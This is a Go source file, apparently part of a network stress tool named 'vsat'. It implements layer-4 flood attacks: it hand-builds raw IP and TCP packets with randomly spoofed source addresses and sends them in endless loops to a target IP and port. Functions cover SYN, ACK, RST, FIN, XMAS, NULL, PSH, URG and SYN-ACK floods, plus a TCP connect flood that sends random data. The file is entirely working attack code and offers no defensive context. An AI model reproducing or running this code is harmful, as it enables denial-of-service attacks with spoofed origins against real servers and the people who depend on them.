package l4

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/MatrixTM26/vsat/internal/methods"
	"github.com/MatrixTM26/vsat/internal/random"
)

const (
	FlagFIN = 0x01
	FlagSYN = 0x02
	FlagRST = 0x04
	FlagPSH = 0x08
	FlagACK = 0x10
	FlagURG = 0x20
)

func BuildIPHeader(SrcIP, DstIP string, Protocol byte, PayloadLen int) []byte {
	H := make([]byte, 20)
	H[0] = 0x45
	H[1] = 0x00
	binary.BigEndian.PutUint16(H[2:4], uint16(20+20+PayloadLen))
	binary.BigEndian.PutUint16(H[4:6], uint16(random.RandomInt(1, 65535)))
	H[6] = 0x40
	H[7] = 0x00
	H[8] = 64
	H[9] = Protocol
	Src := net.ParseIP(SrcIP).To4()
	Dst := net.ParseIP(DstIP).To4()
	copy(H[12:16], Src)
	copy(H[16:20], Dst)
	Cksum := random.CalculateChecksum(H)
	binary.BigEndian.PutUint16(H[10:12], Cksum)
	return H
}

func BuildTCPHeader(SrcIP, DstIP string, DstPort uint16, Flags byte, Payload []byte) []byte {
	SrcPort := uint16(random.RandomInt(1024, 65535))
	T := make([]byte, 20)
	binary.BigEndian.PutUint16(T[0:2], SrcPort)
	binary.BigEndian.PutUint16(T[2:4], DstPort)
	binary.BigEndian.PutUint32(T[4:8], uint32(random.RandomInt(0, 2147483647)))
	binary.BigEndian.PutUint32(T[8:12], 0)
	T[12] = 0x50
	T[13] = Flags
	binary.BigEndian.PutUint16(T[14:16], 65535)

	Pseudo := make([]byte, 12+len(T)+len(Payload))
	copy(Pseudo[0:4], net.ParseIP(SrcIP).To4())
	copy(Pseudo[4:8], net.ParseIP(DstIP).To4())
	Pseudo[8] = 0
	Pseudo[9] = 6
	binary.BigEndian.PutUint16(Pseudo[10:12], uint16(len(T)+len(Payload)))
	copy(Pseudo[12:], T)
	copy(Pseudo[12+len(T):], Payload)
	Cksum := random.CalculateChecksum(Pseudo)
	binary.BigEndian.PutUint16(T[16:18], Cksum)
	return T
}

func RawTCPExecutor(Cfg *methods.Config, Flags byte, Stop <-chan struct{}) {
	Conn, Err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if Err != nil {
		TCPConnectExecutor(Cfg, Stop)
		return
	}
	defer Conn.Close()

	DstAddr := &net.IPAddr{IP: net.ParseIP(Cfg.IP)}

	for {
		select {
		case <-Stop:
			return
		default:
		}
		SrcIP := random.RandomIP()
		TCP := BuildTCPHeader(SrcIP, Cfg.IP, uint16(Cfg.Port), Flags, nil)
		IP := BuildIPHeader(SrcIP, Cfg.IP, 6, len(TCP))
		Pkt := append(IP, TCP...)
		N, Err := Conn.WriteTo(Pkt, DstAddr)
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func TCPConnectExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Conn, Err := net.DialTimeout("tcp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		Conn.Write(random.RandomBytes(random.RandomInt(512, 65535)))
		Cfg.Stats.RequestsCount.Add(1)
		Cfg.Stats.BytesSent.Add(65535)
		Conn.Close()
	}
}

func SYNExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagSYN, Stop)
}

func ACKExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagACK, Stop)
}

func RSTExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagRST, Stop)
}

func FINExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagFIN, Stop)
}

func XMASExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagFIN|FlagPSH|FlagURG, Stop)
}

func PSHExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagPSH|FlagACK, Stop)
}

func URGExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagURG|FlagACK, Stop)
}

func NULLExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, 0x00, Stop)
}

func SYNACKExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	RawTCPExecutor(Cfg, FlagSYN|FlagACK, Stop)
}
